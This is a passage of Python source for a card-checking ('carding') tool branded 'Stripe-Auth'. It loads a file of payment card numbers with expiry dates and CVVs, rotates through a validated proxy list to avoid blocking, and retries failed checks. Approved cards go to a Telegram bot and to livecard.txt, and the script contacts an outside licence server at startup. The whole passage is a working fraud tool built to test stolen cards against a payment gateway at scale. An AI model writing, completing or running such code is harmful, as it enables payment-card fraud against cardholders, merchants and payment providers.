                                    CHATID_TELEGRAM=CHATID_TELEGRAM,
                                    card=card,
                                    gateway_status=f"{status} ✅",
                                    gateway_name="Stripe Auth",
                                    dev_link="https://t.me/xqndrs66",
                                )
                                return card, resp, message, status, True

                            else:
                                retried = True
                                retry_done += 1
                                await fix_flag(counter, retried, Error, "RETRY")
                                stat_text1 = await format_stats(counter)
                                print(
                                    f"{Fore.WHITE}- {Fore.YELLOW}{statuscode} {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                                    f"{Fore.WHITE}--> {Fore.YELLOW}{message or status or {'No response..Retrying'}}{Style.RESET_ALL}"
                                )
                                await asyncio.sleep(min(attempt**2, 30))
                                continue

            except KeyboardInterrupt:
                if stop_event and animation_task:
                    await stopanime(stop_event, animation_task)
                print(
                    f"\n{Fore.WHITE}[{Fore.RED}Interrupt{Fore.WHITE}] "
                    f"Execution was stopped by the user...{Style.RESET_ALL}"
                )
                sys.exit(1)

            except aiohttp.ClientHttpProxyError:
                Error = True
                retried = True
                retry_done += 1
                await fix_flag(counter, retried, Error, "RETRY")
                stat_text1 = await format_stats(counter)
                await stopanime(stop_event, animation_task)
                print(
                    f"{Fore.WHITE}- {Fore.YELLOW}RETRY {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                    f"{Fore.WHITE}--> {Fore.YELLOW}Connection through proxy was blocked or failed.{Style.RESET_ALL}"
                )

            except (
                aiohttp.ServerDisconnectedError,
                aiohttp.ClientOSError,
                aiohttp.ClientResponseError,
                aiohttp.ClientConnectionError,
                aiohttp.ClientPayloadError,
                aiohttp.ClientProxyConnectionError,
                aiohttp.ClientConnectorError,
                aiohttp.ClientConnectorSSLError,
                aiohttp.ClientError,
                aiohttp.ContentTypeError,
                asyncio.TimeoutError,
                asyncio.CancelledError,
                asyncio.IncompleteReadError,
                ConnectionResetError,
                ConnectionAbortedError,
                ConnectionRefusedError,
                BrokenPipeError,
                ConnectionError,
                socket.gaierror,
                socket.timeout,
                socket.herror,
                socket.error,
                TimeoutError,
                OSError,
                ssl.SSLError,
                ssl.CertificateError,
                http.client.RemoteDisconnected,
                http.client.BadStatusLine,
                http.client.IncompleteRead,
            ) as e:
                Error = True
                retried = True
                retry_done += 1
                await fix_flag(counter, retried, Error, "ERROR")
                stat_text1 = await format_stats(counter)
                if stop_event and animation_task:
                    await stopanime(stop_event, animation_task)

                reason = {
                    aiohttp.ServerDisconnectedError: "Server unexpectedly closed the connection.",
                    aiohttp.ClientOSError: "Low-level client OS error.",
                    aiohttp.ClientResponseError: "Invalid HTTP response from the server.",
                    aiohttp.ClientConnectionError: "Client failed to connect to the server.",
                    aiohttp.ClientPayloadError: "Error while reading response payload.",
                    aiohttp.ClientProxyConnectionError: "Failed to connect through the proxy.",
                    aiohttp.ClientConnectorError: "Could not connect to host.",
                    aiohttp.ClientConnectorSSLError: "SSL connection failed.",
                    aiohttp.ClientError: "A generic client-side error occurred.",
                    aiohttp.ContentTypeError: "Unexpected response content type.",
                    asyncio.TimeoutError: "Async operation timed out.",
                    asyncio.CancelledError: "Async task was cancelled.",
                    asyncio.IncompleteReadError: "Connection closed before complete response.",
                    ConnectionResetError: "Connection reset by the remote server.",
                    ConnectionAbortedError: "Connection aborted locally.",
                    ConnectionRefusedError: "Remote server refused the connection.",
                    BrokenPipeError: "Broken pipe during network write.",
                    ConnectionError: "Generic connection error.",
                    socket.gaierror: "DNS resolution failed.",
                    socket.timeout: "Socket timed out.",
                    socket.herror: "Host error during name resolution.",
                    socket.error: "Generic socket error.",
                    TimeoutError: "Request timed out.",
                    OSError: "System-level network I/O error.",
                    ssl.SSLError: "SSL/TLS handshake failed.",
                    ssl.CertificateError: "SSL certificate validation failed.",
                    http.client.RemoteDisconnected: "Remote server disconnected unexpectedly.",
                    http.client.BadStatusLine: "Invalid HTTP status line received.",
                    http.client.IncompleteRead: "Incomplete HTTP response body.",
                }.get(type(e), f"{e}")

                print(
                    f"{Fore.WHITE}- {Fore.YELLOW}RETRY {Fore.WHITE}- {cardnum}|{mm}|{yy}|{cvv} "
                    f"{Fore.WHITE}--> {Fore.CYAN}{type(e).__name__}{Fore.LIGHTWHITE_EX}: "
                    f"{Fore.YELLOW}{reason}{Style.RESET_ALL}"
                )

            if attempt >= MAX_RETRIES:
                await fix_flag(counter, retried, Error, "FAILED")
                stat_text1 = await format_stats(counter)
                print(
                    f"{Fore.RED} ⇢ {Fore.WHITE}[{Fore.LIGHTRED_EX}FAILED{Fore.WHITE}] --> "
                    f"{Fore.RED}{cardnum}|{mm}|{yy}|{cvv} {Fore.WHITE}--> "
                    f"{Fore.LIGHTRED_EX}Gave up after {Fore.LIGHTWHITE_EX}("
                    f"{Fore.LIGHTRED_EX}{retry_done}{Fore.LIGHTWHITE_EX}/"
                    f"{Fore.LIGHTRED_EX}{MAX_RETRIES - 1}{Fore.LIGHTWHITE_EX}) retries "
                    f"{Fore.LIGHTRED_EX}({MAX_RETRIES} attempts total){Style.RESET_ALL}"
                )
                return card, False

            await asyncio.sleep(min(attempt**2, 20))

    return card, False


counter = AsyncCounters()


class ProxyCounter:
    def __init__(self):
        self.stats = {"LIVE": 0, "DEAD": 0}
        self.lock = asyncio.Lock()

    async def increment(self, label: str):
        async with self.lock:
            if label in self.stats:
                self.stats[label] += 1

    async def snapshot(self):
        async with self.lock:
            return self.stats.copy()


# ==== Logger Class ====
class ProxyLogger:
    def log(self, text: str):
        sys.stdout.write("\r\033[K")
        sys.stdout.write(f"{text}\n")
        sys.stdout.flush()


# ==== Spinner Animation ====
async def proxy_spinner(message: str, counter: ProxyCounter, stop_event: asyncio.Event):
    spinner_chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    index = 0
    while not stop_event.is_set():
        stats = await counter.snapshot()
        text = (
            f"{spinner_chars[index % len(spinner_chars)]} {message} "
            f"{Fore.GREEN}LIVE:{stats.get('LIVE', 0)} "
            f"{Fore.RED}DEAD:{stats.get('DEAD', 0)}{Style.RESET_ALL}"
        )
        sys.stdout.write("\r\033[K")
        sys.stdout.write(f"{text}")
        sys.stdout.flush()
        await asyncio.sleep(0.1)
        index += 1


def normalize_proxy(raw_proxy: str | None) -> str | None:

    if raw_proxy is None or not isinstance(raw_proxy, str):
        return None

    raw_proxy = raw_proxy.strip().rstrip("/")
    if not raw_proxy:
        return None

    if "://" in raw_proxy:
        split_scheme = raw_proxy.split("://", 1)
        if len(split_scheme) != 2:
            return None
        scheme, rest = split_scheme
    else:
        scheme, rest = "http", raw_proxy

    parts = rest.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"{scheme}://{host}:{port}"
    elif len(parts) == 4:
        host, port, user, pwd = parts
        return f"{scheme}://{user}:{pwd}@{host}:{port}"
    return None


PROXY_REGEX = re.compile(
    r"""^\s*
        # Optional scheme (http, https, socks5)
        (?:(?P<scheme>https?|socks5)://)?
        # Optional credentials (user or domain\user, password)
        (?:
            (?P<user>[^:@\s\\\/]+(?:[\\\/][^:@\s\\\/]+)?(?:@[^:@\s]+)?) # user@domain.com atau domain\user
            :
            (?P<pwd>[^@/\s]+)
            @
        )?
        # Host: IP/domain
        (?P<host>(?:\d{1,3}\.){3}\d{1,3}|[a-zA-Z0-9.\-]+)
        :
        (?P<port>\d+)
        # Optional credentials at the end (ip:port:user:pwd atau ip:port:user@domain:pwd)
        (?:
            :
            (?P<user2>[^:\s\\\/]+(?:[\\\/][^:\s\\\/]+)?(?:@[^:\s]+)?) # domain\user atau user@domain.com
            :
            (?P<pwd2>[^\s:]+)
        )?
        (?:/)?\s*$
    """,
    re.VERBOSE,
)


# ==== Helpers ====
def build_proxy_url(line: str, default_scheme="http"):
    m = PROXY_REGEX.match(line.strip())
    if not m:
        return None

    scheme = m.group("scheme") or default_scheme
    host = m.group("host")
    port = m.group("port")

    # Prioritas: user:pwd@host:port lalu ip:port:user:pwd
    user = m.group("user") or m.group("user2") or ""
    pwd = m.group("pwd") or m.group("pwd2") or ""

    auth = f"{user}:{pwd}@" if (user or pwd) else ""
    return f"{scheme}://{auth}{host}:{port}"


def extract_ip_port(proxy_url: str):
    return re.sub(r"^https?://(?:[^@]+@)?", "", proxy_url)


# ==== Proxy Validator ====
def validate_single_proxy(
    line,
    proxy_logger,
    proxy_counter,
    proxy_loop,
    test_url="https://vgba.org",
    timeout=6,
):
    proxy_url = build_proxy_url(line)
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    display = extract_ip_port(proxy_url) if proxy_url else line.strip()

    def safe_count(label):
        if proxy_counter and proxy_loop:
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    proxy_counter.increment(label), proxy_loop
                )
                fut.result()
            except:
                pass

    if not proxies:
        proxy_logger.log(f"{Fore.RED}DEAD{Style.RESET_ALL} | {display}")
        safe_count("DEAD")
        return None

    try:
        resp = requests.get(test_url, proxies=proxies, timeout=timeout)
        if resp.ok:
            proxy_logger.log(f"{Fore.GREEN}LIVE{Style.RESET_ALL} | {display}")
            safe_count("LIVE")
            return proxies
    except:
        pass

    proxy_logger.log(f"{Fore.RED}DEAD{Style.RESET_ALL} | {display}")
    safe_count("DEAD")
    return None


async def validate_proxies_from_file(
    filepath, proxy_logger, proxy_counter, max_threads=PROXY_VALIDATION_THREADS
):
    proxy_loop = asyncio.get_running_loop()
    proxy_stop_event = asyncio.Event()
    proxy_spinner_task = asyncio.create_task(
        proxy_spinner("Checking working proxies ~ ", proxy_counter, proxy_stop_event)
    )

    def load_lines():
        with open(filepath, encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]

    lines = await asyncio.get_event_loop().run_in_executor(None, load_lines)
    live_proxies = []

    def worker():
        results = []
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [
                executor.submit(
                    validate_single_proxy, line, proxy_logger, proxy_counter, proxy_loop
                )
                for line in lines
            ]
            try:
                for fut in as_completed(futures):
                    res = fut.result()
                    if res:
                        results.append(res)
            except KeyboardInterrupt:
                # hentikan langsung, return hasil sementara
                return results
        return results

    live_proxies = await asyncio.get_event_loop().run_in_executor(None, worker)

    proxy_stop_event.set()
    await proxy_spinner_task
    print()
    return live_proxies


def load_proxies_skip(filepath: str):
    with open(filepath, encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip()]
    proxies = []
    for line in lines:
        proxy_url = build_proxy_url(line)
        if proxy_url:
            proxies.append({"http": proxy_url, "https": proxy_url})
    print(
        f"{Fore.YELLOW}Skip validation: using {len(proxies)} proxies{Style.RESET_ALL}"
    )
    return proxies


# ==== Proxy Runner ====
async def run_proxy_selection(proxy_path, skip, proxy_logger, proxy_counter):
    if skip == "y":
        return load_proxies_skip(proxy_path)

    live_proxies = []
    try:
        live_proxies = await validate_proxies_from_file(
            proxy_path, proxy_logger, proxy_counter
        )
    except KeyboardInterrupt:
        if live_proxies:
            print(
                f"\n{Fore.YELLOW}Validation interrupted. Using {len(live_proxies)} proxies so far.{Style.RESET_ALL}"
            )
        else:
            print(
                f"\n{Fore.RED}Validation interrupted. No proxies validated.{Style.RESET_ALL}"
            )
            return []
    return live_proxies


BOT_TOKEN = ""
CHATID_TELEGRAM = ""
HIDDEN_ID = CHATID_TELEGRAM[:4] + "****"
HIDDEN_TOKEN = BOT_TOKEN[:10] + "****"


def starter():
    try:
        client = Client("https://verif.stecu.cloud", "StripeCCN")
        client.verify()
        client._up()
        Lic.show_full()
    except KeyboardInterrupt:
        print("\n" + col("Exiting...", Fore.YELLOW))
        os._exit(0)
    except IOError:
        print("\n" + col("IOError encountered. Exiting...", Fore.YELLOW))
        os._exit(0)
    except Exception as e:
        print("\n" + col(f"Error: {e}", Fore.RED))
        os._exit(0)


async def main() -> None:
    global BOT_TOKEN, CHATID_TELEGRAM
    os.system("cls" if os.name == "nt" else "clear")
    await load_user_agents()
    try:
        from pyfiglet import figlet_format

        banner = pyfiglet.figlet_format("Stripe-Auth", font="stop", width=105)

        print(Fore.BLUE + banner)
    except ImportError:
        os.system("pip install pyfiglet &> /dev/null")
        asyncio.run(main())

    print("- " * 36)
    Lic.show_full()
    print("- " * 36)

    token_input = input(
        f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] Enter Telegram bot token "
        f"({Fore.RED}default: {Fore.RESET}{HIDDEN_TOKEN}):{Fore.YELLOW} "
    ).strip()

    chatid_input = input(
        f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] Enter Telegram chat ID "
        f"({Fore.RED}default: {Fore.RESET}{HIDDEN_ID}):{Fore.YELLOW} "
    ).strip()

    BOT_TOKEN = token_input or BOT_TOKEN
    CHATID_TELEGRAM = chatid_input or CHATID_TELEGRAM

    path = (
        input(
            f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] Enter path to card file ({Fore.RED}default: {Fore.WHITE}card.txt):{Fore.YELLOW} "
        ).strip()
        or "card.txt"
    )
    if not path.lower().endswith(".txt") or not os.path.isfile(path):
        print(f"{Fore.RED}Invalid card file: {path}{Style.RESET_ALL}")
        return
    with open(path, "r", encoding="utf-8") as f:
        cards = [line.strip() for line in f if line.strip()]
    if not cards:
        print(f"{Fore.YELLOW}No valid card data in: {path}{Style.RESET_ALL}")
        return

    proxy_path = (
        input(
            f"{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] Enter path to proxy file ({Fore.RED}default: {Fore.WHITE}proxy.txt):{Fore.YELLOW} "
        ).strip()
        or "proxy.txt"
    )
    if not proxy_path.lower().endswith(".txt") or not os.path.isfile(proxy_path):
        print(f"{Fore.RED}Invalid proxy file: {proxy_path}{Style.RESET_ALL}")
        return

    skip = (
        input(
            f"{Fore.WHITE}[{Fore.YELLOW}•{Fore.WHITE}] Skip proxy validation? {Fore.WHITE}({Fore.WHITE}Y{Fore.WHITE}/{Fore.RED}n{Fore.WHITE}):{Fore.YELLOW} "
        )
        .strip()
        .lower()
    )
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + banner)
    print("- " * 36)
    Lic.show_full()
    print("- " * 36)
    proxy_counter = ProxyCounter()
    proxy_logger = ProxyLogger()
    live_proxies = await run_proxy_selection(
        proxy_path, skip, proxy_logger, proxy_counter
    )
    if not live_proxies:
        return

    global PROXY_CYCLE
    PROXY_CYCLE = cycle(live_proxies)
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.LIGHTRED_EX + banner)
    print("- " * 36)
    print(
        f"{Fore.CYAN}[+]{Fore.WHITE} Processing {Fore.YELLOW}{len(cards)}{Fore.WHITE} card(s)"
    )
    print(
        f"{Fore.CYAN}[+]{Fore.WHITE} Using threads{Fore.YELLOW}: {CONCURRENT_REQUESTS}{Style.RESET_ALL}"
    )
    print(
        f"{Fore.CYAN}[+]{Fore.WHITE} Proxies {Fore.GREEN}live{Fore.YELLOW}: {len(live_proxies)}{Style.RESET_ALL}"
    )
    print(
        f"{Fore.CYAN}[+]{Fore.WHITE} Results save to{Fore.YELLOW}: livecard.txt{Style.RESET_ALL}"
    )
    print("- " * 36)
    Lic.show_full()
    print("- " * 36)

    start_time = time.perf_counter()
    sem = asyncio.Semaphore(CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession() as session:
        tasks = [check_cc(session, card, sem, counter) for card in cards]
        await asyncio.gather(*tasks)

    elapsed = time.perf_counter() - start_time
    minutes, seconds = divmod(elapsed, 60)
    stats = await counter.snapshot()

    print("- " * 36)
    print(
        f"{Fore.CYAN}[ DEV ]{Fore.WHITE} Author/Coded By: {Fore.YELLOW}Kiansantang DEV"
    )
    print(
        f"{Fore.CYAN}[ DONE ]{Fore.WHITE} Finished checking {Fore.YELLOW}{len(cards)}{Fore.WHITE} card(s)."
    )
    print(
        f"{Fore.CYAN}[ TIME ]{Fore.WHITE} Taken time{Fore.YELLOW}: {int(minutes)}m {seconds:.2f}s{Style.RESET_ALL}"
    )
    print(
        f"{Fore.GREEN}APPROVED: {stats.get('APPROVED', 0)}  "
        f"{Fore.RED}DECLINED: {stats.get('DECLINED', 0)}  "
        f"{Fore.MAGENTA}ERROR: {stats.get('ERROR', 0)}  "
        f"{Fore.YELLOW}RETRY: {stats.get('RETRY', 0)}{Style.RESET_ALL}"
    )
    print("- " * 36, "\n")


def _run(cmd, *, check=True):
    r = subprocess.run(cmd, text=True, capture_output=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"{' '.join(cmd)} -> {r.returncode}\n{r.stderr.strip()}")
    return r.stdout.strip()


if __name__ == "__main__":
    try:
        starter()
    except KeyboardInterrupt:
        print("\n" + col("Exiting...", Fore.YELLOW))
        os._exit(0)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n" + col("Exiting...", Fore.YELLOW))
        os._exit(0)

    except Exception as e:
        print("\n" + col(f"Error: {e}", Fore.RED))
        os._exit(0)
